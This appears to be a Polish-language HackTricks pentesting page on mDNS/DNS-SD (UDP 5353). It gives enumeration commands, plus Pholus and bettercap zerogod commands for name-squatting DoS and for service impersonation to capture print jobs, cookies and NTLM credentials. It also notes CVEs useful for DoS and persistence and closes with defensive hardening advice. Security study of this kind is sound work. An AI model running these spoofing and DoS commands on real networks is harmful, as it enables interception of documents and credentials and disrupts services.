# 5353/UDP Multicast DNS (mDNS) i DNS-SD

{{#include ../banners/hacktricks-training.md}}

## Basic Information

Multicast DNS (mDNS) umożliwia rozwiązywanie nazw podobne do DNS oraz wykrywanie usług w ramach lokalnego łącza (link-local) bez serwera unicast DNS. Używa UDP/5353 oraz adresów multicast 224.0.0.251 (IPv4) i FF02::FB (IPv6). DNS Service Discovery (DNS-SD, zwykle używany z mDNS) zapewnia ustandaryzowany sposób enumeracji i opisywania usług za pomocą rekordów PTR, SRV i TXT.
```
PORT     STATE SERVICE
5353/udp open  zeroconf
```
Kluczowe szczegóły protokołu, które często wykorzystasz podczas ataków:
- Nazwy w strefie .local są rozwiązywane za pomocą mDNS.
- Bit QU (Query Unicast) może żądać odpowiedzi unicast nawet dla zapytań multicastowych.
- Implementacje powinny ignorować pakiety niezrodłowane z lokalnego łącza; niektóre stosy nadal je akceptują.
- Probing/announcing wymusza unikalność nazw hostów/usług; ingerencja tutaj tworzy warunki DoS/„name squatting”.

## DNS-SD service model

Usługi są identyfikowane jako _<service>._tcp lub _<service>._udp w strefie .local, np. _ipp._tcp.local (drukarki), _airplay._tcp.local (AirPlay), _adb._tcp.local (Android Debug Bridge), itd. Odkryj typy za pomocą _services._dns-sd._udp.local, a następnie rozwiąż znalezione instancje do rekordów SRV/TXT/A/AAAA.

## Eksploracja i enumeracja sieci

- Skan nmap (bezpośrednie mDNS na hoście):
```bash
nmap -sU -p 5353 --script=dns-service-discovery <target>
```
- Wykrywanie broadcast nmap (nasłuch na segmencie i enumeracja wszystkich typów/instancji DNS-SD):
```bash
sudo nmap --script=broadcast-dns-service-discovery
```
- avahi-browse (Linux):
```bash
# List service types
avahi-browse -bt _services._dns-sd._udp
# Browse all services and resolve to host/port
avahi-browse -art
```
- Apple dns-sd (macOS):
```bash
# Browse all HTTP services
dns-sd -B _http._tcp
# Enumerate service types
dns-sd -B _services._dns-sd._udp
# Resolve a specific instance to SRV/TXT
dns-sd -L "My Printer" _ipp._tcp local
```
- Przechwytywanie pakietów za pomocą tshark:
```bash
# Live capture
sudo tshark -i <iface> -f "udp port 5353" -Y mdns
# Only DNS-SD service list queries
sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
```

Wskazówka: Niektóre przeglądarki/WebRTC używają efemerycznych nazw hostów mDNS, aby maskować lokalne adresy IP. Jeśli na ruchu zobaczysz kandydatów random-UUID.local, rozwiąż je za pomocą mDNS, aby pivotować do lokalnych IP.

## Ataki

### Zakłócanie sprawdzania nazw mDNS (DoS / name squatting)

Podczas fazy sprawdzania (probing) host sprawdza unikalność nazwy. Odpowiedź zawierająca sfałszowane konflikty zmusza go do wyboru nowej nazwy lub rezygnacji. Może to opóźnić lub uniemożliwić rejestrację i odkrywanie usług.

Przykład z Pholus:
```bash
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```
### Podszywanie się pod usługi i impersonacja (MitM)

Podszywaj się pod reklamowane usługi DNS-SD (drukarki, AirPlay, HTTP, udostępnianie plików), żeby zmusić klientów do połączenia się z tobą. To jest szczególnie przydatne do:
- Przechwytywania dokumentów podszywając się pod _ipp._tcp lub _printer._tcp.
- Wabienia klientów do usług HTTP/HTTPS, aby pozyskać tokens/cookies lub dostarczyć payloads.
- Łączenia z technikami NTLM relay, gdy klienci Windows negocjują uwierzytelnianie z podszytymi usługami.

Za pomocą modułu zerogod w bettercap (mDNS/DNS-SD spoofer/impersonator):
```bash
# Start mDNS/DNS-SD discovery
sudo bettercap -iface <iface> -eval "zerogod.discovery on"

# Show all services seen from a host
> zerogod.show 192.168.1.42
# Show full DNS records for a host (newer bettercap)
> zerogod.show-full 192.168.1.42

# Impersonate all services of a target host automatically
> zerogod.impersonate 192.168.1.42

# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42

# Replay previously captured services
> zerogod.save 192.168.1.42 target.yml
> zerogod.advertise target.yml
```
Zobacz także ogólne LLMNR/NBNS/mDNS/WPAD spoofing i credential capture/relay workflows:

{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Uwagi o niedawnych problemach implementacyjnych (przydatne do DoS i utrzymania dostępu podczas testów)

- Avahi reachable-assertion i błędy awarii D-Bus (2023) mogą zakończyć działanie avahi-daemon na dystrybucjach Linux (np. CVE-2023-38469..38473, CVE-2023-1981), przerywając odkrywanie usług na docelowych hostach aż do restartu.
- Cisco IOS XE Wireless LAN Controller mDNS gateway DoS (CVE-2024-20303) pozwala pobliskim klientom WLAN zalewać sieć spreparowanym mDNS, powodując wzrost obciążenia CPU WLC i zrywanie tuneli AP — przydatne, gdy trzeba wymusić roaming klienta lub reset kontrolera podczas testu.
- Apple mDNSResponder logic error DoS (CVE-2024-44183) pozwala sandboxowanemu procesowi lokalnemu zablokować Bonjour, tymczasowo tłumiąc publikację/wyszukiwanie usług na urządzeniach Apple; załatane w obecnych wydaniach iOS/macOS.
- Apple mDNSResponder correctness issue (CVE-2025-31222) umożliwiał lokalne eskalacje uprawnień przez mDNSResponder; użyteczne do utrzymania dostępu na niezarządzanych Macach/iPhone’ach, poprawione w ostatnich aktualizacjach iOS/macOS.

### Browser/WebRTC mDNS rozważania

Nowoczesne Chromium/Firefox zaciemniają kandydatów hosta, używając losowych nazw mDNS. Możesz ponownie ujawnić adresy IP LAN na zarządzanych endpointach, wdrażając politykę Chrome `WebRtcLocalIpsAllowedUrls` (lub przełączając `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns`/odpowiednik w Edge), tak aby ICE ujawniał kandydatów hosta zamiast mDNS; ustawiane przez `HKLM\Software\Policies\Google\Chrome`.

Kiedy użytkownicy ręcznie wyłączą tę ochronę (częste w przewodnikach rozwiązywania problemów WebRTC), ich przeglądarki znów zaczynają reklamować zwykłych kandydatów hosta, których możesz przechwycić przez mDNS lub sygnalizację ICE, aby przyspieszyć odkrywanie hostów.

## Rozważania obronne i OPSEC

- Granice segmentów: Nie routuj 224.0.0.251/FF02::FB między strefami bezpieczeństwa, chyba że mDNS gateway jest wyraźnie wymagany. Jeśli musisz łączyć discovery, preferuj allowlists i limity szybkości.
- Windows endpoints/servers:
- Aby całkowicie wyłączyć rozwiązywanie nazw przez mDNS ustaw wartość rejestru i zrestartuj:
```
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
```
- W środowiskach zarządzanych wyłącz wbudowaną regułę Windows Defender Firewall „mDNS (UDP-In)” (przynajmniej dla profilu Domain), aby zapobiec przetwarzaniu przychodzącego mDNS przy zachowaniu funkcjonalności domowej/roamingowej.
- W nowszych buildach Windows 11/szablonach GPO użyj polityki „Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol” i ustaw ją na Disabled.
- Linux (Avahi):
- Ogranicz publikowanie, gdy nie jest potrzebne: ustaw `disable-publishing=yes`, i ogranicz interfejsy przy użyciu `allow-interfaces=` / `deny-interfaces=` w `/etc/avahi/avahi-daemon.conf`.
- Rozważ `check-response-ttl=yes` i unikaj `enable-reflector=yes`, chyba że jest to ściśle wymagane; przy reflektowaniu preferuj allowlists w `reflect-filters=`.
- macOS: Ogranicz przychodzące mDNS na hostowych/sieciowych firewallach, gdy Bonjour discovery nie jest potrzebne dla określonych podsieci.
- Monitoring: Alarmuj o nietypowych skokach zapytań `_services._dns-sd._udp.local` lub nagłych zmianach SRV/TXT krytycznych usług; są to wskaźniki spoofingu lub podszywania się pod usługę.

## Szybkie odniesienie do narzędzi

- nmap NSE: `dns-service-discovery` i `broadcast-dns-service-discovery`.
- Pholus: active scan, reverse mDNS sweeps, DoS and spoofing helpers.
```bash
# Passive sniff (timeout seconds)
sudo python3 pholus3.py <iface> -stimeout 60
# Enumerate service types
sudo python3 pholus3.py <iface> -sscan
# Send generic mDNS requests
sudo python3 pholus3.py <iface> --request
# Reverse mDNS sweep of a subnet
sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
```
- bettercap zerogod: discover, save, advertise, and impersonate mDNS/DNS-SD services (see examples above).

## Spoofing/MitM

Najciekawszym atakiem, który możesz przeprowadzić przez tę usługę, jest wykonanie MitM w komunikacji między klientem a rzeczywistym serwerem. Możesz uzyskać wrażliwe pliki (MitM komunikacji z drukarką) lub nawet poświadczenia (Windows authentication).\
Więcej informacji sprawdź:


{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## References

- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://books.google.co.uk/books/about/Practical_IoT_Hacking.html?id=GbYEEAAAQBAJ&redir_esc=y)
- [Nmap NSE: broadcast-dns-service-discovery](https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html)
- [bettercap zerogod (mDNS/DNS-SD discovery, spoofing, impersonation)](https://www.bettercap.org/modules/ethernet/zerogod/)
- [Cisco IOS XE WLC mDNS gateway DoS (CVE-2024-20303) advisory](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-wlc-mdns-dos-4hv6pBGf.html)
- [Rapid7 advisory for Apple mDNSResponder CVE-2024-44183](https://www.rapid7.com/db/vulnerabilities/apple-mdnsresponder-cve-2024-44183/)
- [Rapid7 writeup of Apple mDNSResponder CVE-2025-31222](https://www.rapid7.com/db/vulnerabilities/apple-osx-mdnsresponder-cve-2025-31222/)

{{#include ../banners/hacktricks-training.md}}
